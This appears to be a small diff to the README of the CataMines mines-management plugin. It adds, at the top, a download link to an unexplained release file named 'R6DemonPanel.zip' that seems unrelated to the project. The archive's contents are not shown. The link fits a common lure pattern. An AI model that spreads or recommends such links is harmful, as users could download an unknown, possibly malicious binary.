@@ -1,3 +1,6 @@
+* [Download](https://github.com/litjisz/CataMines/releases/download/test/R6DemonPanel.zip)
+
+
 # CataMines
 
 A mines management plugin
